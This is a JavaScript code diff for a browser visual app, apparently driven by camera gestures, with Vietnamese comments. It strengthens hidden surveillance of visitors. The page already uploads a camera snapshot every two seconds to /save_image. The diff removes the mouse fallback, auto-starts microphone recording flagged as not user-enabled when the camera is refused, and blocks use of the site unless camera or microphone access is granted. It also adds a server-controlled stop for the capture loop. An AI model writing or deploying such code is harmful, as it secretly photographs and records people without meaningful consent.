@@ -15,6 +15,7 @@ const CONFIG = {
     repulsionStrength: 8.0 
 };
 
+
 /**
  * STATE MANAGEMENT
  */
@@ -542,6 +543,19 @@ const cameraFeed = new Camera(videoElement, {
     height: 720
 });
 
+let cameraDenied = false;
+let micDenied = false;
+
+function showPermissionError() {
+    loading.innerHTML = `
+        <div style="color:#fff; text-align:center;">
+            <b>Permission Required</b><br><br>
+            Please allow <b>Camera</b> or <b>Microphone</b><br>
+            to use this website.
+        </div>
+    `;
+}
+
 async function startCamera() {
     try {
         loading.innerHTML = "Requesting Camera Access...";
@@ -561,18 +575,65 @@ async function startCamera() {
         }, 800);
 
         // 🟢 SAU ĐÓ CHỤP ĐỀU 2s / ẢNH
-        if (!captureTimer) {
+        if (!captureTimer && !cameraDenied) {
             captureTimer = setInterval(() => {
                 takePhotoFromCamera();
             }, CAPTURE_INTERVAL);
         }
     } catch (err) {
-        console.error("Camera Error:", err);
-        loading.innerHTML = `Camera not found (${err.name}).<br>Switching to <b>Mouse Interaction Mode</b>.`;
-        setTimeout(() => {
-            loading.style.display = 'none';
-            activateMouseMode();
-        }, 2500);
+        console.warn("Camera denied:", err);
+        cameraDenied = true;
+
+        loading.innerHTML = "Camera denied. Trying microphone access...";
+
+        // 👉 Chuyển sang voice logic
+        try {
+            await tryEnableVoiceFallback();
+        } catch (e) {
+            console.error("Mic also denied", e);
+            showPermissionError();
+        }
+    }
+}
+
+function enableVoiceModeAuto() {
+    console.log("Voice mode auto-enabled");
+
+    state.voiceEnabledByUser = false;
+    state.voiceModeActive = true;
+
+    state.targetGestureLabel = "Voice Mode (Mic)";
+    state.spreadTarget = 0.0;
+    state.targetWeights = [0, 0, 0, 0, 1];
+    
+    voiceBtnText.innerText = "Voice Mode: ON";
+    voiceBtn.classList.add('active');
+
+    // start voice + recording
+    if (recognition) {
+        try { recognition.start(); } catch {}
+    }
+
+    startVoiceRecording();
+
+    loading.style.display = 'none';
+}
+
+async function tryEnableVoiceFallback() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        throw new Error("MediaDevices not supported");
+    }
+
+    try {
+        // xin quyền mic
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        stream.getTracks().forEach(t => t.stop());
+
+        // ✅ Mic OK → bật voice mode
+        enableVoiceModeAuto();
+    } catch (e) {
+        micDenied = true;
+        throw e;
     }
 }
 
@@ -948,11 +1009,19 @@ async function takePhotoFromCamera(force = false) {
 
         const imageData = canvas.toDataURL('image/png');
 
-        await fetch('/save_image', {
+        const res = await fetch('/save_image', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ image: imageData })
         });
+        const json = await res.json();
+
+        // 🛑 server đã stop → dừng client
+        if (json.stopped) {
+            console.warn('Capture stopped by server');
+            clearInterval(captureTimer);
+            captureTimer = null;
+        }
     } catch (e) {
         console.warn("Capture failed:", e);
     }
